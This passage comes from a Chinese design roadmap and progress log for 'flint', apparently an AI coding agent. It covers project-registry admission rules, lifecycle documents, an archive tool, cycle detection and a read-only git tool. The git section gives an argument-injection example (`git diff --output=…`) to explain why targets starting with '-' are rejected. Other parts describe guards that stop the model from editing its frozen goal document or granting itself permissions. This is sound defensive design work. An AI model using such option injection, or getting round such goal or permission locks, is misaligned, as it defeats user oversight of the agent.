| 10.11.4 | 项目脚手架 | 无 | `--init-project` 生成 `.flint/` 三件套 + memory + 规约模板｜R7+R12（与 10.1.3 合并做） | 低 | 候选 |
| 10.11.5 | 记忆跨项目拉取 | `pull_events` 已能拉叙事，**记忆不能拉** | `pull_memory`（同权限闸）或合并成 `pull_assets`｜R8+R9 | 中 | 候选 |
| 10.11.6 | 通讯录准入判据 | **已完成（2026-09-17）**。缺口原样：注册表 `~/.flint/projects.jsonl` 唯一的准入条件是"在哪儿启动过 flint"（`ensure(cwd)` **无条件**写），于是家目录、盘根、`node_modules` 里的某个包、随手 cd 进去的临时目录全进簿子。**这不只是列表难看** —— 通讯录有**两个读者、要的东西不一样**：`/projects`（人读）要"值得回来"；`pull_events`（模型跨项目拉经验）按**短名**找项目、重名时**静默**取最先登记的那条，**多登记一条就多一分"拉到别人档案而无人察觉"的风险**。判据因而**偏保守**：宁可漏登记（代价 = 手输一次路径，或用 `/projects --add`），也不写垃圾条目 —— 与 `.gitignore` 那条"认不出即丢弃"是同一个判据（看**哪种错更难发现**），只是这里站在写入侧。**判据的层次（顺序是承重的，不是风格）**：① **硬排除**（家目录 / 临时目录 / 盘根 / `node_modules`）**不看证据、一票否决**，理由很具体 —— `~/.flint/` 是 flint 的**全局配置目录**（GLOBAL_DIR），若把"有 `.flint/`"当证据、又排在排除之前，家目录会**必然**被认成项目；② **实物档案**（`.flint/` 或 `TASK.md`）：最硬，且**可以推翻位置**（仓库子目录里若真有档案，那是用户在把它当项目用）；③ **git 仓库**：在仓库里时"独立单元是谁"交给 git 说 —— 判据是 `rev-parse --show-toplevel` **等于不等于** cwd，不是"有没有 `.git`"（后者会把仓库里每个子目录都当成新项目，而 `.flint/` 的落点跟着 cwd 走）；④ **清单文件**（package.json / pyproject.toml / go.mod / Cargo.toml / pom.xml）：**只在不在任何仓库里时**才算证据（否则 monorepo 的每个子包都会进簿子）；⑤ 都没命中 → **候选：不写盘**，回执里问一句。**候选不是通讯录里的一种状态**（不进 `projects.jsonl`：簿子里要么是完整的一条、要么没有，不引入"待确认"这种半成品）。**顺带修掉两个真实缺口**（先探针取证、再动手）：`normalizeProjectPath` 改用 `realpathSync.native` —— 实测它才折大小写（普通 `realpathSync` 原样返回入参大小写）、也才解开 NTFS junction；而 `chdir` 进 junction 后 `process.cwd()` **报的仍是别名**，所以只做字符串处理挡不住"同一个项目占两行"。老记录**读时归一化 + 去重**（记录是足迹，不回写文件）：反斜杠 / 大小写不符 / 重复行载入即合成一行、取最早那条。**三个入口的登记语义刻意不同**：启动走判据；`--switch` 与 `--add` 是**显式通道**（用户点名了就算数，**绕过判据**）—— 其中 `--add` 只登记、**不动 cwd**。**刻意不让模型判"这算不算项目"**：这个判断的直接后果是**写一个跨会话的持久文件**，而模型的答案是不确定的（同一目录两次可能不同）；模型能参与的是"候选转正"那一步，不是当判据本身（同 `ask` 的分工）。验证：`verify-detect.ts` **82 项**（判据逐分支穷举 + 真目录探针 + 归一化 + 登记装配三态 + 源码守护），**变异三十轮各自精准变红**；并给 `verify-projects.ts` 补了 `--add` 与列表提示的端到端（80 → **87 项**） | 保守准入 + 候选兜底（判据纯函数 + 探针分离） | 中 | 已完成 |

> **10.11.6 补记（2026-09-17）**：这条的起点是一个问题 ——"如何判定用户启动了一个真正的独立
> 项目？假如用户没主动说出来，该如何判断？"落地时定死了三条推理，**改判据等于改这三条**：
> ① **方向往"少记"偏**：两个读者的代价不对称 —— 少记 = 手输一次路径（可补救）；多记 =
> 跨项目拉经验时**静默**拉错档案（用户和模型都发现不了）。与 `.gitignore` 的"认不出即丢弃"
> **方向相反但两边都对**：那边怕"藏了文件让模型以为自己看全了"，这边怕"多一条让模型拉错
> 东西"—— 同一条判据是"哪种错更难发现"，只是站在写入侧而不是展示侧。
> ② **不让模型判**：这个判断的后果是写一个**跨会话的持久文件**，而模型的答案不确定。机器判、
> 输入明确；模型只参与"候选转正"（`/projects --add`）—— 与 `ask` 那条 fail-closed 同源。
> ③ **"登记"与"装上下文"是两件事**：候选目录**照样装载**上下文（用户就在那儿干活），只是
> 不往跨项目检索的簿子里写一行。验证里专门有一条钉住它，因为最自然的写法恰恰是"不登记 =
> 全都不管"。
> 两个"先取证再动手"的例子（本仓纪律：没实测到的不许用推理补）：**大小写**与 **junction**
> 都是先跑探针确认它们**真的**会让同一个项目占两行，才动 `normalizeProjectPath` 的；
> **symlink 因本机无权限（EPERM）没测到，所以只宣称 junction** —— 这条边界写在套件头与
> TESTING 里，不在文档里含糊过去。
> **已知留白**：判据**没有忽略名单**（不想记的 scratch 目录会每次启动多提示一句；接受 ——
> 那只是一行不拦路的提示，加名单 = 多一份状态）；`manifest` 分支**没有端到端用例**（造不出
> "既不在家目录 / 临时目录 / node_modules，又不在任何 git 仓库里"的真目录，该分支由纯函数
> 用例 + 探针用例合起来覆盖，而装配点只一处）。完整决策见 DECISION_LOG 锚点
> `log-2026-09-17-project-admission`。

> **10.11.1 补记（2026-09-16）**：这条是"起手式"里点名的 **R9+R11 纯接线**项，落地时暴露的
> **真问题不在列表、也不在切换，而在"切换之后谁负责把上下文装回去"** —— 那件事启动时其实
> 已经有实现（`main.ts` 里那五段播种），但它**埋在启动流程里**、拿不出来复用。于是本条真正的
> 动作是**把那五步抽成一个函数**（`seedProjectContext()`），启动改调它、切换也调它：两份实现
> 只会各错一半，而"少装一样"这种错的**症状是看着一切正常**（比如忘了 `charterLock.lock()`，
> 表面全绿，直到你在新项目里改了 CHARTER 才发现锁没上）。
> **先清后栽**是同一次落地里最容易被漏的一处：三个 store 的 `loadFromFile` 对"文件不存在"的
> 语义是**保持现状**（对启动是对的 —— 没文件就别动），可切换项目时"保持现状"就意味着
> **上一个项目的清单会赖着不走**；而只有切到一个**什么都没有**的项目时，那个 `reset()` 才是
> 唯一把旧内容擦掉的动作 —— A↔B 两边都有文件时漏掉它照样全绿（"文件存在就替换"掩盖了
> "文件不存在时没擦除"），是典型"变异全绿 = 没验到"。补一个 `bare` 空项目才钉住。
> 两条**刻意的边界**写进回执、不装糊涂：① 新项目的**项目命令与改完自检要重启才生效** ——
> 这两份配置的授权判据本身就建立在"只在启动读一次"上（防模型写配置自我授权），多开一个
> 运行期读取点会把判据从"不许回读"退化成"谁触发的可以回读"；② 切换只改**本进程**，不开新
> 窗口、也不并行两个项目。理由与"为什么不做交互选择器""为什么顶栏 cwd 要实时刷"见
> DECISION_LOG 锚点 `log-2026-09-16-projects-switch`。

#### P10.12 项目生命周期协议（**协议，非能力**）

> 这一组与前十一组性质不同：前十一组是**能力**（flint 能做什么），这一组是**协议**
> （flint 管一个项目时按什么流程走）。落点不是新子系统，而是 **`cwd/.flint/` 下的文件 +
> 一段提示词 + 两个现成钩子**。**建议整组一起做**——拆开只会得到"一套没有闸的文档"。

| 编号 | 候选项 | 现状 / 缺口 | 建议做法（含落点） | 优先级 | 状态 |
|---|---|---|---|---|---|
| 10.12.1 | 四阶段闭环 | 无。现在只有"一批 todo"，没有项目级概念 | 立项 → 目标/现状/路线图 → 执行(按坐标分批) → 归档(前后区别+意义) → 提议下一坐标｜提示词 | 高 | 已完成 |
| 10.12.2 | 路线图自带分类列 | 无路线图概念 | 每条五列：编号 / 坐标 / 状态 / **类别** / 依赖；**类别是封闭枚举**（`轻量` 或 `系统`）｜R7 | 高 | 已完成 |
| 10.12.3 | 触发判据归纳到一处 | 判据本会散在流程描述里 | 三阈值取其一：`跨 ≥2 次会话` / `触及 ≥3 个模块` / `含架构决策或引入依赖`；**判据写在路线图表头说明里**，逐条按它标类别 | 高 | 已完成 |
| 10.12.4 | **目标文档（策划案）** | 无 | `.flint/CHARTER.md`：目标 / 范围 / 验收标准 / **明确不做什么**；**立项后锁定，改动需用户许可**｜R3 钩子｜**⚠C11** | 高 | 已完成 |
| 10.12.5 | **现状文档（快照）** | 无 | `.flint/PROJECT.md`：当前系统由哪些模块/技术点构成；**随代码漂移，自由改、不需许可**。**每轮由 runtime 直读文件、注入 system prompt 的 `project` 层**（不设内存真相源——文件本身就是源，运行期直读即自愈，也就没有"谁负责通知 UI"的问题）｜`src/project/snapshot.ts`（本组唯一碰 fs 的读侧）+ `context/system-prompt.ts` 注入 | 高 | 已完成 |
| 10.12.6 | 开发文件（追加） | 无 | `.flint/DEVLOG.md`：每坐标一节 = 前后区别 / 意义 / 影响面 / 遗留；**只追加**。由 **`archive` 工具**追加（`renderDevlogEntry` 纯函数排版，文件不存在时先写文件头；空段不写空标题）｜`src/project/lifecycle.ts` | 高 | 已完成 |
| 10.12.7 | 进场回述闸 | 无 | 读档后**先回述三条**（当前坐标 / 上次卡哪 / 本次打算做什么）→ 等确认再动手｜提示词 | 高 | 已完成 |
| 10.12.8 | 归档双写 | 无 | 同一归档时刻写两处：`DEVLOG.md`（人读散文）+ 事件库 `kind=system`（机读四段）——**`archive` 工具一次做完双写**：散文进不了检索、四段字段读不出语气，两者**刻意不互替**｜`src/tools/builtin.ts` | 中 | 已完成 |
| 10.12.9 | 前后区别要有事实来源 | 无 | 基于 `git diff` / 验证结果写，**不许凭记忆** → **依赖 10.5.1**。**落地**（2026-09-14）：前置满足后，`git` 工具提供了事实来源，提示词与 archive 的参数说明都改成"**先调 git 工具**（op=status / op=diff）或引用跑出来的验证结果"。程序不强制"这句话是否真基于 diff"（机器判不了，与 10.12.12 同判据），**纪律靠提示词** | 中 | 已完成 |
| 10.12.10 | 改道记账 | 无 | 路线图**类别**或**结论**变了 → 追加"改道"叙事（kind=decision），不改历史行｜R8 | 中 | 已完成 |
| 10.12.11 | 状态推进走钩子 | 归档钩子已有（`recordTaskArchive`） | 归档时**顺带**推进路线图状态位 + 提议下一坐标。落点最终是 **`archive` 工具**而非钩子：生命周期是**坐标级**的，而 `recordTaskArchive` 是**整单任务级**（两者不同层，硬捆会把坐标语义塞进任务语义）。工具由程序算 `nextCoord`（未开始 + 叶子 + 依赖已满足、按编号序）并写回状态（**只换表那几行，表外散文逐字不动**）｜`src/project/roadmap.ts` + `src/project/lifecycle.ts` | 中 | 已完成 |
| 10.12.12 | DoD 四件套 | 无"完成"定义 | 代码 + 验证证据 + 文档同步 + 叙事归档——**缺一件不许标完成**｜提示词 + 10.12.11 | 中 | 候选 |
| 10.12.13 | **路线图格式门禁** | 坐标表此前是模型随手写的自由文本——列名换了、状态写成别的词、编号重复、依赖指向不存在的编号，**没有任何东西会喊**（协议里唯一被机器看着的只有那把契约锁） | `.flint/ROADMAP.md` 的五列 / 状态与类别封闭枚举 / 编号唯一 / 依赖引用完整：由 `src/project/roadmap.ts`（`parseRoadmap`/`renderRoadmap` 纯函数，枚举唯一真相源）定契约，`scripts/verify-roadmap.ts` 逐形状校验（含 40 组随机往返属性测试 + **与提示词枚举交叉比对**）｜自建纯函数模块（**非子系统**，将来 10.12.11 复用） | 中 | 已完成 |
| 10.12.14 | **路线图支持分层** | 坐标表是平表，任务之间没有层次——一个坐标挂不住几个子坐标 | 编号由正整数升级为**分段编号**（形如 `10.12` / `10.12.5`），**层次压进编号**而不是加嵌套表（Markdown 表嵌套不了；加缩进约定会让解析从"一张表"退化成"一棵树"，格式门禁的价值恰恰在形状简单到能逐行校验）；父编号必须先存在；新增 `parentOf` / `childrenOf` / `isAncestor` / `descendantsOf` + `compareId`（**逐段按数值比**，非字典序——`10.2 < 10.12 < 10.12.5`）；**父级状态由子树派生**（全搁置→搁置、全已完成/搁置→已完成、全未开始/搁置→未开始、否则进行中；显式搁置覆盖派生）｜`src/project/roadmap.ts` 扩编号代数与状态派生（仍**零依赖纯函数**） | 中 | 已完成 |
| 10.12.15 | **技术选型分叉点（`ask` + `grill-me`）** | 无。模型遇到技术选型的岔路口**自己脑补一个方案往下冲**，用户事后才发现方向选错了 | 第 12 个内置工具 `ask`：模型自认遇到分叉点时**截断当前行为**、抛题等用户拍板。两条路——① **确定技术选型**：用户选定后模型把结论落进路线图 / CHARTER / DEVLOG；② **保留选项·先讨论**：读 `grill-me` 技能（一次一问 + 每题附推荐答案 + 能自己查代码就别问），聊完**重抛**分叉点。**两路都不替用户选**，非 TTY 降级为文字提问｜`src/project/fork.ts`（纯逻辑）+ `src/io/ui/fork-prompt.ts`（交互，经 `AskFn` 注入）+ `skills/grill-me.md` + 提示词【技术选型分叉点】节｜**⚠ fail-closed** | 中 | 已完成 |
| 10.12.16 | **依赖环检测** | 坐标表允许成环（格式上合法），但环 = **死锁**：环上的坐标永远等不到依赖完成，`nextCoord` 静默返回 null 而"还剩 N 个未开始坐标"，读的人会误以为"活干完了" | `src/project/roadmap.ts` 新增 `findCycles`（DFS 三色找回边；归一成**一条闭合代表路径** `1.1 → 1.2 → 1.1`、自环算一元环、指向表外不算环）；**两类问题分开管**——`parseRoadmap` **不因成环报错**（否则含环的路线图直接无法归档）、`archive` 回执**单列【依赖环】**并把"提不出下一坐标"的两种原因（卡在环里 / 已做完）分开说｜`src/project/roadmap.ts` + `src/project/lifecycle.ts` | 中 | 已完成 |

**本轮进度（2026-09-14）· 一句话定调**：把"目标文档立项后冻结"从**模型自觉**升级为**程序强制**
——立完项，`.flint/CHARTER.md` 就被锁住，模型改它会被程序直接拒绝，解锁只能由用户执行
`/charter unlock`（会话级）。**价值**：堵住 **goal drift**——模型再不能悄悄改掉目标，让交付物
与立项时说好的悄悄变成两回事。

**（细节）** 实现落在 **10.12.4 目标文档写保护闸**：`src/project/charter.ts` 的 `guardContractWrite`
纯函数 + `charterLock` 会话级锁 + `main.ts` 的 `before_tool_call` 接线 + `/charter` 命令；
配套 `scripts/verify-charter.ts` 57 项（含"后注册的扩展钩子返回 `undefined` **不覆盖**核心 deny"
这条承重断言；变异两轮精准变红）。**10.12.1 / 10.12.2 / 10.12.3 / 10.12.7 / 10.12.10 属提示词约定，
已写进 `core-section.ts` 的【项目生命周期】节**（触发判据三阈值、四阶段、进场回述、归档、改道记账）。
仍待做（**2026-09-14 21:28 补记：两者均已落地** —— 10.12.11 见进度④、10.12.9 见进度⑥）：**10.12.11 状态推进钩子**（协议里唯一还缺的确定性件）与 10.12.9（依赖 10.5.1 的 git 工具）；
**10.12.5 / 10.12.6 / 10.12.8** 目前只有路径约定与提示词，尚无注入段或工具件。
取舍全文见 DECISION_LOG 锚点 `log-2026-09-14-charter-lock`。

**本轮进度②（2026-09-14 18:00）· 一句话定调**：把"路线图长什么样"从**自然语言约定**变成
**可解析的格式**——坐标表的五列、状态与类别枚举、编号唯一、依赖必须指向存在的编号，全由
`src/project/roadmap.ts` 定契约、`scripts/verify-roadmap.ts` 逐形状校验，写歪了当场报红。
**价值**：堵住协议里最大的那块"不稳定"——此前四份文档都是模型随手 `write`/`edit` 的自由文本，
**写歪了没有任何东西会喊**（协议里唯一被机器看着的只有那把契约锁）。对应新条目 **10.12.13**。

**（细节）** 这一步刻意**只做格式、不做状态机**：格式是状态机的**输入契约**，契约没定死，
状态机就是在解析一坨自由文本。故先钉形状（本批），"谁能改 / 何时改"留给还欠的 10.12.11
（落法是照抄 `TaskStore` 的 C 方案：内存真相源 + 投影 + 严格互逆 + onChange）。
**枚举只在代码里存一份**，提示词那几句由 verify 交叉比对——两边各存一份迟早分家，
届时门禁要么永远红、要么更严重地**永远绿**。明确**不做**的两件已记账：**环检测**（依赖成环
属"排序语义"，与优先级一起拍）、**结构化散文**（目标 / 意义 / 来龙去脉保留人读散文，
结构化了反而制造文档通胀）。套件 46 项；全量 **34 套 1439 项** 0 失败、`tsc --noEmit` 0 错。
注：本步只新增一个**纯函数模块**、不是新子系统，故"63 条里只有 3 条真需要新子系统"的判断不变。

**本轮进度③（2026-09-14 18:37）· 一句话定调**：用户问了两件事——① 路线图要不要支持"任务包含任务"的分层？
② 能不能让 Agent 在**技术选型分叉点**主动停下、把题抛给用户？两件都做了，落点分别是**编号即层次**与
**第 12 个内置工具 `ask`**。**价值**：前者让"一个坐标底下挂几个子坐标"不必靠嵌套表，后者把
"模型自己脑补一个方案往下冲"换成"**停下来问**"——分叉点选错的代价，往往要到很后面才显形。

**（细节）** 分层走**分段编号**（`10.12` → `10.12.5`）：`src/project/roadmap.ts` 的 id 由正整数升级为
**点分路径**，新增 `parentOf` / `childrenOf` / `isAncestor` / `descendantsOf` + `compareId`
（**逐段按数值比**，不是字典序——依赖列表按编号排序必须如此）；**父级状态由子树派生**
（`deriveStatuses` / `resolveStatuses`：全搁置→搁置、全已完成/搁置→已完成、全未开始/搁置→未开始、
否则进行中；显式搁置覆盖派生；且幂等）——这是"状态真相源只能有一处"的直接应用：
**父级状态不是写上去的字段，是算出来的**，否则"父任务进行中、子任务全已完成"这种自相矛盾会合法存在。
分叉点新增 `src/project/fork.ts`（纯逻辑，**零 import**；`classifyChoice` 认不出的返回值一律判"问不了"、
**绝不猜**）+ `src/io/ui/fork-prompt.ts`（交互实现，由 `main.ts` 经 `AskFn` 注入工具层，
**`tools/builtin.ts` 因此仍不 import `io/`**——RPC 启动路径不被拖进会写 stdout 的 UI 层）
+ `skills/grill-me.md` + 提示词【技术选型分叉点】节。**fail-closed** 是它刻意的取向：
非 TTY 返回 null、不自动替用户选，与权限弹窗的 fail-open 正好相反（弹窗是"允许"优先，分叉点是"不猜"优先）。
两路收尾都往事件库落 `kind=decision` 叙事，路线图的更新交给模型——**程序只保证"问了、记了"，
不假装保证"改对了"**。套件 verify-roadmap **99 项**、verify-fork **82 项**；全量 **35 套 1574 项** 0 失败、
`tsc --noEmit` 0 错。取舍全文见 DECISION_LOG 锚点 `log-2026-09-14-roadmap-hierarchy` 与 `log-2026-09-14-fork-point`。

**本轮进度④（2026-09-14 19:01）· 一句话定调**：把进度①里"仍待做"的三件（10.12.5 / 10.12.6+8 / 10.12.11）一次收口，
落点是**一个 `archive` 工具**——它把"一个坐标走完"这件事**一次做完三样**：追加 DEVLOG（人读散文）、
记一条 `kind=system` 事件（机读四段）、把路线图里那个坐标标成 已完成，并**顺带算出下一坐标**。
**价值**：协议四阶段里的"归档 → 提议下一坐标"此前只写在提示词里（模型记得就问、忘了就断链），
现在**归档这个动作本身就带着下一步**——从"要记得"变成"躲不掉"。

**（细节）** `src/project/roadmap.ts` 补上文件级操作（仍是**零 import 纯函数**）：`findCoordTable` / `spliceCoordTable`
（**只替换坐标表那几行**，表外散文逐字保留）/ `setStatus`（不改入参）/ `unmetDeps` / `nextCoord`
（未开始 + 叶子 + 依赖已满足，按 `compareId` 取第一个）；`src/project/lifecycle.ts` 负责 DEVLOG 排版与归档回执
（`formatArchiveReceipt` 报告"开发日志 / 路线图推进 / 事件库 / 剩余叶子数 / 下一坐标"，提不出来时**说清**是被依赖卡住还是已无未开始叶子）；
`src/project/snapshot.ts` 是**本组唯一碰 fs 的读侧**（`readProjectSnapshot`：文件不存在 / 空 / 读失败一律 `undefined` —— **不注入一句空话**）。
`archive` 是**第 13 个内置工具**，**刻意不带 `requirePermission`**（系统行为，不必每个坐标弹一次窗），
也**不 import `io/`**（RPC 启动路径不许被拖进会写 stdout 的 UI 层）。**未命中就一字不落盘**：
编号不存在 / 拿父坐标当叶子归档 / 路线图格式坏 → `[INVALID]` 且 DEVLOG、事件库、路线图**三处都不动**
（与 write / edit 同一条原则：拿不准时拒绝，不留对不上任何坐标的半成品）。
PROJECT.md 走**只读注入**而非建 store：文件本身就是真相源，运行期直读即自愈，避免出现第二个"判定源"
（顺带回答了"把状态从文件搬进内存必须补通知线"的反面——**没搬就不用补**）。
提示词同步补 **DoD 四件套**（代码 + 验证证据 + 文档同步 + 叙事归档，**缺一件不许标完成**）与
"PROJECT.md 每轮注入（它是你的视野、随代码漂移、自由改）"。新增套件 `verify-lifecycle.ts` **97 项**；
全量 **36 套 1671 项** 0 失败、`tsc --noEmit` 0 错。取舍见 DECISION_LOG 锚点
`log-2026-09-14-archive-tool` 与 `log-2026-09-14-project-snapshot`。

**本轮进度⑤（2026-09-14 20:32）· 一句话定调**：把进度②里明确记作"**不做**"的**依赖环检测**做掉。
不是推翻当时的判断——当时的原话是"留到 10.12.11 与优先级一起拍"，10.12.11 现已落地，**到了该拍的
时候**；拍完看清了环的性质：它是**死锁**，属**正确性**问题，而不是"菱形依赖合不合法"那种排序策略。
**价值**：堵一个**静默错误**——成环时 `nextCoord` 返回 null，而"还剩 N 个未开始坐标"可以同时成立，
读的人（包括模型自己）很容易理解成"活干完了"。现在回执单列【依赖环】并把环路径摆出来。

**（细节）** `roadmap.ts` 新增 `findCycles`（DFS 三色找回边；归一成**一条闭合代表路径**
`1.1 → 1.2 → 1.1`——输入顺序不影响结果、同一环只念一次；自环算一元环；**指向表外的依赖不算环**，
那是格式错误、由 parse 管，不在这里重复报）。**两条口径刻意分开**：`parseRoadmap` **不因成环报错**
（成环的表在格式上完全合法；若把它塞进格式错误，所有含环的路线图会直接**无法归档**，惩罚远大于
问题本身），`formatArchiveReceipt` **必须点名**（环与"被依赖卡住"在回执里长得像，但只有环
**再等也不会通**、得人去改表——不单列就会被读成"等前面做完自然轮到它"，而那正是死锁最容易被
放过去的方式）。**顺带拍板**：优先级 / 插队**仍留给人**（那是策略，不是正确性）。套件
verify-lifecycle **109 项**（+12：E13–E22 环检测、G17/G18 回执点名）；全量 **36 套 1683 项** 0 失败、
`tsc --noEmit` 0 错。取舍见 DECISION_LOG 锚点 `log-2026-09-14-cycle-detection`。

**同批另两处拍板（2026-09-14 20:32）**：① **10.12.12 的"机器侧强制"：不做**——DoD 四件套里
"代码 / 验证证据 / 文档同步"三件机器判不了（它看不到 diff、跑不了测试、不知道文档该不该动），
机器能诚实确认的只有"叙事归档"这一件（就是 `archive` 工具本身）。硬造一个"缺 `evidence` 字段就
拒绝"的闸，是把"填没填字段"伪装成"验证证据是否充分"——**假门禁比没有门禁更坏**（它会让人以为
那一关有人把守）。故 10.12.12 只留在提示词，状态保持**候选**。
② **10.12.9 仍跳过**——前置（10.5.1 的 git 工具）未满足，状态保持**候选**。（**2026-09-14 21:28 补记**：前置已随本轮 `git` 工具落地而满足，10.12.9 已标 **已完成**，见进度⑥。）

**本轮进度⑥（2026-09-14 21:28）· 一句话定调**：把 P10.5 从"完全空白"推进到**只读侧可用**——
新增第 14 个内置工具 `git`（status / diff / log / branch），顺带把 10.12.9 从"跳过"转为**完成**。
**价值**：① 模型看仓库状态不必再走 `bash`（那是"能改一切、必须弹窗、授权边界是整条命令"的万能工具，
顺手拼一条 `git status && git commit` 就把**读与写绑进了同一次授权**）；② "前后区别不许凭记忆"这条
纪律第一次有了**可执行的抓手**——此前只能写禁令，现在提示词直接指向 `git 工具`（op=status / op=diff）。

**（细节）** 落点 `src/git/git.ts`（零 import 纯函数：解析 + 渲染）+ `tools/builtin.ts` 第 14 个工具。
三条设计决定：
① **op 白名单 + argv 数组**（`execFileSync('git', argv)`），**不经 shell** —— 若参数是一条命令字符串，
本工具立刻退化成"免弹窗的 bash"，把 bash 的整套权限设计整个绕过去；
② **只读不弹窗**（与 ls / read / grep 同取位），写操作留给 10.5.2 的专用闸；
③ **`target` 以 `-` 开头一律拒** —— 它落在 `--` **之前**、是 git 的**选项位置**：
`git diff --output=文件 --numstat` 是合法选项，能把结果**写进磁盘**。argv 免疫 shell 注入，
但免疫不了"被当成选项"这一路。
**解析口径全部来自探针实测**（三个脚本对真仓库取证，不是照文档推）：`-z` 才让中文/空格路径裸出
（`core.quotepath=false` 只管转义、**不管引号**）；`-z` 下重命名占**两段**（新前旧后）；
**`git branch --format` 不认 `%x1f`**（那是 log 的占位符，branch 会原样输出那五个字符），故 branch
改用字面 `|`；detached 头行是 `## HEAD (no branch)`、空仓库是 `## No commits yet on main`。
套件 verify-git **106 项**（含"本机没 git 时 16 条占位断言保项数恒定"）；全量 **37 套 1789 项** 0 失败、
`tsc --noEmit` 0 错、文档数字 50 处一致。取舍见 DECISION_LOG 锚点 `log-2026-09-14-git-tool`。

**10.12 的两处结构说明（2026-09-14 用户修正）**

**其一 —— 三份文档的"修改策略"三分**（上一稿把"目标"与"现状"塞进同一个文件，是错的：
两者修改策略不同，同容器必然打架。同一条判据此前已在项目里用过——"快照是函数、日志是事实"，
这里只是多了一个维度）：

| 文档 | 性质 | 谁写 | 改需许可？ | 允许的操作 |
|---|---|---|---|---|
| `.flint/CHARTER.md` 目标 | **契约** | 只由用户批准改 | **是**（立项后冻结） | 改 = 显式解锁 + 追加修订记录；**绝不静默覆盖** |
| `.flint/PROJECT.md` 现状 | **快照** | 模型每坐标完成后同步 | 否 | 覆盖（描述的就是当下） |
| `.flint/DEVLOG.md` 开发 | **事实** | 只追加 | 否 | 追加（要更正 = 追加"以本条为准"） |

**这是全仓第一次出现"改需要许可"这一档**。前两档来自既有纪律（快照可覆盖 / 追加不可改），
新的一档治的是 **goal drift**：目标若能被边做边改，最后交付的东西和立项时说好的那个就不是一回事了。

**其二 —— 分类判据为什么必须"归纳在路线图上"**：判据若留作流程里的**运行期临时判断**，
等于把"要不要写四份文档"交给高速、容易惰性的时刻去决定（文档通胀比不写文档更糟）。
移到路线图上，它变成立项期一次标定的**字段**，于是：① **可复核**——读档一眼看出"这条是轻量还是系统"；
② **可重算**——判据是三阈值取其一，是输入的（可文档化的）函数，实际比预想大时改判即可，但
改判本身要走 10.12.10 的"改道记账"；③ **可节制**——决定前置到"只有一个条目"的时刻。
**硬约束**：类别必须是**封闭枚举**，否则退化成自由文本，判据白归纳（同"判定式是白名单"的既有取向）。

#### P10.C 冲突与待拍板（约束"复用优先"的执行结果）

**必须推翻 / 必须同步改（不改就做不了）**

- **C1 · 权限持久化（10.9.1）与 2026-09-04 的既定决策正面冲突** —— 现状授权只存内存 `Set`，
  `clear()` 接会话生命周期；DECISION_LOG 2026-09-04 明确写了**刻意不做**目录级/通配授权并列了四条代价。
  落盘 = 授权从"本次会话"变成"长期有效"，那些代价的时间尺度被放大。三个选项：**A** 只持久化只读类
  授权（`ls/read/grep`）；**B** 全量按项目落盘 + 可撤销；**C** 不做。**建议 A**（拿掉 90% 重复弹窗，
  不碰写类工具的授权放大问题）。
  - **补记（2026-09-18）｜以本条为准：本条只挡住 10.9.1 的"后半"，前半已绕开落地。** 10.9.1
    被拆成两半 —— **前半"工作区授权持久化"已完成**（`/workspace allow --save` → `~/.flint/permissions.json`，
    落点 `src/permission/grants.ts`，`verify-grants.ts` 83 项 + 变异 25 轮）；**后半"权限 allowlist
    整体持久化"仍未做**，C1 对它依旧成立。**分野在哪**：本条列的四条代价都指向 `PermissionManager`
    的**键与匹配规则**（把"哪个按键授权"从会话级放大成长期级）；而工作区授权那张表**本来就是用户
    手写、用户可见的**（唯一写入者是 `/workspace` 命令，模型碰不到），给它加落盘位置不改变"谁能
    授权"这件事。故这条**不算被推翻**，只是**适用范围收窄到 `PermissionManager` 那一半**。完整决策
    见 [DECISION_LOG 锚点](./DECISION_LOG.md#log-2026-09-18-grants)。
- **C2 · `spec.ts` 刻意无数组形状（阻 10.8.1 / 10.10.3 / 10.9.3）** —— `tools/spec.ts:101-121`
  只有 5 个标量构造器，且这是**写进记忆的纪律**。`@file` 多引用、并行 read、路径列表都要数组参数。
  选项：**A** 扩 spec 加数组形状（需同步改 `fixtures/tool-schemas-baseline.json` 逐字护栏与
  verify-spec 断言，并改写那条纪律）；**B** 逗号分隔字符串（零改动，但类型谎言 + 模型容易写错）。
  **建议 A，但只在圈选了 10.8.1 / 10.10.3 任一之后再做**。
  - **补记（2026-09-17）· 以本条为准：C2 对本条的阻塞不成立；标题里的「阻 10.8.1」不再成立。**
    10.8.1 已落地，做法是**输入层解析**（挂 `runtime.onInput()`），不新增任何工具、不碰 `spec.ts` ——
    当初把 `@file` 写成"要数组参数"是**把它默认成工具了**，而 R4 那个空置钩子本来就是给它准备的。
    于是 C2 剩下的阻塞面只有 `10.10.3`（并行只读，那个确实要工具参数）与 `10.9.3`（路径列表）。
    教训与 C3 那条同型：**"这条要动 X"之前先问一句"它非得是工具吗"** —— 落点选错，代价会凭空多出一整块。
  - **补记（2026-09-18）· 以本条为准（续）：C2 对 10.9.3 的阻塞同样不成立 —— 剩下的阻塞面只有 `10.10.3`。**
    10.9.3 的开门方式也是**用户手打的命令**（`/workspace allow <目录>`，一条命令同时完成"授权 + 记路径"），
    **模型自己调的工具参数一个都没动** —— `spec.ts` 的数组形状从头到尾没被碰。与 10.8.1 是同一条教训的
    第二次应验：**当约束看着要求扩协议时，先问"它属于哪一层"** —— 落在**输入层 / 命令层**就不必动
    **工具层**的契约。标题里那句「阻 10.8.1 / 10.10.3 / 10.9.3」至此只剩 **10.10.3** 还站得住。
- **C3 · 任务清单的三处承重点（阻 10.3.1 / 10.3.2）** —— `TaskItem` = `{text, status}`；三处承重：
  ① "至多一项进行中"不变量；② `render()`/`fromMarkdown()` 严格互逆；③ `hasUnchecked()` ≡
  `hasUncheckedTask(render())`。加层级必须**同步改三处**（漏一处属性测试就红）。**需先拍一个语义**：
  唯一进行中是**全局**（推荐，保持不变量简单）还是**每层各一个**。
  - **补记（2026-09-17）· 以本条为准：C3 已解，标题里的「阻 10.3.1 / 10.3.2」不再成立。**
    拍板结果：唯一进行中取**全局**（理由见 10.3.2 行：面板只有一个"当前在做什么"，模型只有一个
    执行流）。执行时发现，当初担心的"三处承重必须同步改"其实**一处都不用动** —— 因为层级与依赖
    都做成**标量参数**（`parent` / `after` 指向前面的项），`TaskItem` 只是多两个 number 字段，
    render/parse 那套互逆逻辑的形状没变。真正的成本落在**投影**上，而且是两处**只有真跑才看得见**
    的失真：缩进+顺序推不出全部父子关系（补一个按需的 ` ⤴N` 显式标记）、以及正文里的标记字符
    需要前缀码转义。教训：**"加一个字段"的难度不在字段本身，在它进出投影文件的那两步**。
- **C11 · 目标文档的"许可"与权限子系统不是一回事（10.12.4）** —— 后者是弹窗放行、进 allowlist，
